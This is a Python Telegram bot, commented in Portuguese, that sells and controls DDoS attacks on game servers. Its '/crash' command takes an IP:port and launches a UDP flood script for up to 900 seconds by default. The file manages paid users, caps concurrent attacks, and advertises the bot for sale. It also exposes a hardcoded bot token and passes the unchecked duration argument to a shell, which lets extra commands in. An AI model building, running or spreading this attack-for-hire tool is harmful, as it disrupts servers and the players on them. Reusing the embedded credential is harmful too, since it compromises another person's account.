import telebot
import subprocess
import re
import json
import time

# Configura??es do bot
BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}  # Dicion¨¢rio para gerenciar ataques
MAX_ATTACKS = 3  # Limite de ataques simult?neos

# Fun??o para carregar usu¨¢rios autorizados de um arquivo JSON
def carregar_usuarios():
    try:
        with open("usuarios_autorizados.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return [SEU_ID_TELEGRAM]  # Adiciona o ID do dono como padr?o
    except json.JSONDecodeError:
        return [SEU_ID_TELEGRAM]

# Fun??o para salvar usu¨¢rios autorizados em um arquivo JSON
def salvar_usuarios():
    with open("usuarios_autorizados.json", "w") as f:
        json.dump(authorized_users, f)

# Lista de usu¨¢rios autorizados
authorized_users = carregar_usuarios()

# Fun??o para validar o formato de IP:PORTA
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    return re.match(padrao, ip_porta) is not None

# Fun??o para gerenciar o limite de ataques simult?neos
def gerenciar_ataques():
    if len(processos) >= MAX_ATTACKS:
        ataque_antigo = list(processos.keys())[0]
        processo_antigo = processos.pop(ataque_antigo)
        processo_antigo.terminate()
        bot.send_message(SEU_ID_TELEGRAM, f"Ataque para {ataque_antigo} finalizado para liberar espa?o.")

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! ?\n\n"
        "Aqui est?o os comandos dispon¨ªveis para voc¨º:\n\n"
        "*Comandos b¨¢sicos:*\n"
        "`/crash <IP da partida> [tempo]` - Envia um ataque ao IP especificado. "
        "(Padr?o 900 segundos)\n"
        "`/meuid` - Mostra seu ID de usu¨¢rio.\n\n"
        "*Comandos para o dono do bot:*\n"
        "`/adduser <ID>` - Adiciona um usu¨¢rio autorizado.\n"
        "`/removeuser <ID>` - Remove um usu¨¢rio autorizado.\n"
        "`/listusers` - Mostra a lista de usu¨¢rios autorizados.\n\n"
        "Quer comprar o bot? Entre em contato comigo no Telegram: "
        "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
        "_Se precisar de ajuda, estou ¨¤ disposi??o!_ ?"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id not in authorized_users:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) < 2:
        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida> [tempo]")
        return

    ip_porta = comando[1]
    tempo = "900"  # Padr?o de tempo

    if not validar_ip_porta(ip_porta):
        bot.send_message(message.chat.id, "Formato de IP:PORTA inv¨¢lido.")
        return

    if len(comando) == 3:
        tempo = comando[2]

    if ip_porta in processos:
        bot.send_message(message.chat.id, f"J¨¢ existe um ataque em andamento para {ip_porta}.")
        return

    gerenciar_ataques()
    comando_terminal = f"python3 start.py UDP {ip_porta} 10 {tempo}"
    processo = subprocess.Popen(comando_terminal, shell=True)
    processos[ip_porta] = processo
    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {tempo} segundos.")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usu¨¢rio ¨¦: {message.from_user.id}")

# Comando /adduser e /removeuser
@bot.message_handler(commands=['adduser', 'removeuser'])
def admin_commands(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>, /removeuser <ID>")
        return

    try:
        usuario_id = int(comando[1])
    except ValueError:
        bot.send_message(message.chat.id, "ID inv¨¢lido. Por favor, insira um n¨²mero v¨¢lido.")
        return

    if comando[0] == "/adduser":
        if usuario_id not in authorized_users:
            authorized_users.append(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usu¨¢rio {usuario_id} adicionado com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usu¨¢rio j¨¢ autorizado.")
    
    elif comando[0] == "/removeuser":
        if usuario_id in authorized_users:
            authorized_users.remove(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usu¨¢rio {usuario_id} removido com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usu¨¢rio n?o encontrado.")

# Comando /listusers
@bot.message_handler(commands=['listusers'])
def list_users(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    if not authorized_users:
        bot.send_message(message.chat.id, "Nenhum usu¨¢rio autorizado encontrado.")
        return

    user_list = "Lista de usu¨¢rios autorizados:\n\n"
    for user_id in authorized_users:
        cargo = "Dono" if user_id == SEU_ID_TELEGRAM else "Usu¨¢rio"
        user_list += f"ID: {user_id} - Cargo: {cargo}\n"

    bot.send_message(message.chat.id, user_list)

# Fun??o principal
def main():
    while True:
        try:
            bot.polling(non_stop=True, timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)

if __name__ == "__main__":
    main()